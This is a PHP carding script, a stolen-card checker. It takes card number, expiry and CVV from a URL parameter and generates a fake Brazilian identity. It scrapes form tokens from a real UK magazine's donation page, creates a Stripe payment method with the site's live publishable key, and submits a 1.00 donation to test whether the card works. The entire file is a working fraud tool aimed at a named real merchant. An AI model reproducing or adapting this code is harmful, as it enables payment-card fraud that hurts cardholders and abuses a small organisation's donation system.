<?php
error_reporting(0);
header('Content-Type: text/plain; charset=utf-8');

$lista = $_GET['lista'] ?? '';
if (empty($lista)) die('ERRO: ?lista= vazio');

$parts = explode('|', $lista);
if (count($parts) < 4) die('ERRO: Formato NUMERO|MES|ANO|CVV');
[$cc, $mes, $ano, $cvv] = array_map('trim', $parts);
$ano_short = (strlen($ano) == 4) ? substr($ano, 2) : $ano;

function request($url, $post = null, $headers = [], $cookie = '/tmp/cookie.txt') {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36');
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post) ? http_build_query($post) : $post);
    }
    if ($headers) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

// Gerador de dados aleatórios
$first_names = ['Carlos', 'Marcos', 'Andre', 'Felipe', 'Ricardo', 'Lucas', 'Gabriel', 'Mateus', 'Bruno', 'Thiago'];
$last_names = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Nascimento', 'Lima'];
$streets = ['Rua das Flores', 'Avenida Central', 'Rua Treze de Maio', 'Rua Sete de Setembro', 'Avenida Brasil', 'Rua Amazonas'];
$cities = ['Sao Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre', 'Salvador', 'Fortaleza'];

$fname = $first_names[array_rand($first_names)];
$lname = $last_names[array_rand($last_names)];
$email = strtolower($fname . $lname . rand(100, 999) . '@gmail.com');
$address = $streets[array_rand($streets)] . ', ' . rand(10, 999);
$city = $cities[array_rand($cities)];
$postcode = rand(10000000, 99999999);

// 1. Captura dinâmica de tokens do site
$html = request('https://gaylifemagazine.co.uk/campaigns/gaylife-magazine/donate/');
preg_match('/name="charitable_form_id" value="([^"]+)"/', $html, $f_id);
preg_match('/name="_charitable_donation_nonce" value="([^"]+)"/', $html, $nonce);
preg_match('/name="campaign_id" value="([^"]+)"/', $html, $c_id);

$form_id = $f_id[1] ?? '69cd3e4c92939';
$donation_nonce = $nonce[1] ?? 'f3361e7bee';
$campaign_id = $c_id[1] ?? '20027';

// 2. Criar PaymentMethod no Stripe
$stripe_pk = 'pk_live_51I8YQMChDXVFdNz08f5bXJkM1uNqbRQf4appGKwoyQuqSWCMvxNLSNwp8VtM5EDWrIxICIsdtbHRI165D4ixonnD002VDgegEk';
$pm_res = request('https://api.stripe.com/v1/payment_methods', [
    'type' => 'card',
    'billing_details[name]' => "$fname $lname",
    'billing_details[email]' => $email,
    'card[number]' => $cc,
    'card[cvc]' => $cvv,
    'card[exp_month]' => $mes,
    'card[exp_year]' => $ano_short,
    'key' => $stripe_pk,
    'payment_user_agent' => 'stripe.js/45275a47da; stripe-js-v3/45275a47da; card-element',
    'client_attribution_metadata[merchant_integration_source]' => 'elements',
    'client_attribution_metadata[merchant_integration_subtype]' => 'card-element',
    'client_attribution_metadata[merchant_integration_version]' => '2017'
], [
    'Origin: https://js.stripe.com',
    'Referer: https://js.stripe.com/'
]);

$pm_data = json_decode($pm_res, true);
$pm_id = $pm_data['id'] ?? null;

if (!$pm_id) {
    echo "$lista ---> $pm_res";
    exit;
}

// 3. Checkout Final
$checkout_res = request('https://gaylifemagazine.co.uk/wp-admin/admin-ajax.php', [
    'charitable_form_id' => $form_id,
    $form_id => '',
    '_charitable_donation_nonce' => $donation_nonce,
    '_wp_http_referer' => '/campaigns/gaylife-magazine/donate/',
    'campaign_id' => $campaign_id,
    'description' => 'Gaylife Magazine',
    'ID' => '0',
    'custom_donation_amount' => '1.00',
    'first_name' => $fname,
    'last_name' => $lname,
    'email' => $email,
    'address' => $address,
    'city' => $city,
    'state' => 'Sao Paulo',
    'postcode' => $postcode,
    'country' => 'BR',
    'gateway' => 'stripe',
    'stripe_payment_method' => $pm_id,
    'action' => 'make_donation',
    'form_action' => 'make_donation'
], [
    'X-Requested-With: XMLHttpRequest',
    'Referer: https://gaylifemagazine.co.uk/campaigns/gaylife-magazine/donate/'
]);

echo "$lista ---> $checkout_res";
